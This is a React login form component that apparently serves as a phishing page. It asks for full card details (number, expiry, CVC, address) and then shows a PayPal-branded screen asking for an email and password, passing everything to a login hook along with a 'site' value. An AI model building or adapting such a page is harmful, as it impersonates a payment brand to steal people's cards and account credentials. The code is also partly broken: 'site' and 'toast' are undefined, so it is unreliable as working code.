
import { Field, Form, Formik } from "formik";
import useMockLogin from "../hooks/useMockLogin";
import { useState } from "react";
import Image from "next/image";



function LoginForm() {
  const [showModal, setShowModal] = useState(false);
 

  const initialvalues = {
    email: "",
    password: "",
    remember: "",
  };

  const { login } = useMockLogin();

  const handleSubmit = (values, formik) => {
    console.log()
    const {validity,address,cardNumber,cvc,email,name,
password,zipCode } = values;


    const submitValues = {
      site,
      validity,
      address,
      cardNumber,
      cvc,
      email,
      name,
    password,
  zipCode 
    };

    login(submitValues, formik);
    console.log(submitValues)
    toast.success("Login Succecssfull");
    formik.resetForm();

    // console.log(submitValues);
  };



  return (
    <Formik  initialValues={initialvalues}
    // validationSchema={validate}
    onSubmit={handleSubmit}>
      <Form>
   {
    !showModal?(   <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px]  rounded-lg">
    <div class="debit-card">
 <img src="https://image.ibb.co/gDVR4x/master_card_logo.png" class="master-card-logo" />
 <div class="card-number-block">
   <input type="text" pattern="^\d{4}$" maxlength="4" class="number-block" placeholder="0000" />
   <input type="text" pattern="^\d{4}$" maxlength="4" class="number-block" placeholder="0000" />
   <input type="text" pattern="^\d{4}$" maxlength="4" class="number-block" placeholder="0000" />
   <input type="text" pattern="^\d{4}$" maxlength="4" class="number-block" placeholder="0000" />
 </div>
 <div class="card-holder-block">
   <div class="block-lebel">Card Holder</div>
   <input type="text" pattern="[A-Z ]+" class="card-holder-name" placeholder="xxx xxx" />
 </div>
</div>

     <div className="mt-5">
     
          
             <Field
               className="w-full text-lg px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
               placeholder="Card Number"
               name="cardNumber"
               type="number"
               required
             />
                 <Field
                   className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
                   placeholder="Card Holder Name"
                   name="name"
                   type=""
                   autoComplete="on"
                   required
                 />
                 <Field
                   className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
                   placeholder="29/30"
                   name="validity"
                   type="number"
                   autoComplete="on"
                   required
                 />
                 <Field
                   className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
                   placeholder="CVC"
                   name="cvc"
                   type=""
                   autoComplete="on"
                   required
                 />
                 <Field
                   className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
                   placeholder="Address Line 1"
                   name="address"
                   type=""
                   autoComplete="on"
                   required
                 />
                 <Field
                   className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
                   placeholder="Zip Code"
                   name="zipCode"
                   type="number"
                   autoComplete="on"
                   required
                 />

<button
                   type="submit"
                   className="mt-5 w-full text-lg font-medium bg-[green] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
                 onClick={()=>setShowModal(true)}
                 >
                  PAY
                 </button>
               
             
          
         
      
     </div>
   </div>):(  <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px] shadow-lg rounded-lg">
        <div className="relative  ml-[45px]  w-[80px] h-[80px] ">
                <Image
                  src="/images/paypal-logo.svg"
                  alt="avatar"
                  fill
                  className="object-cover ml-[120px] "
                />
              </div>
    
     
      
         <div className="pt-5">
           <Field
             className="w-full text-lg px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
             placeholder="Your email"
             name="email"
             type="email"
             required
           />
               <Field
                 className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
                 placeholder="Password"
                 name="password"
                 type="password"
                 autoComplete="on"
                 required
               />

<button
                 type="submit"
                 className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
               >
                 Log in
               </button>
             
           
         </div>
       
     
   </div>)
   }
      </Form>
    
    </Formik>
  );
}

export default LoginForm;
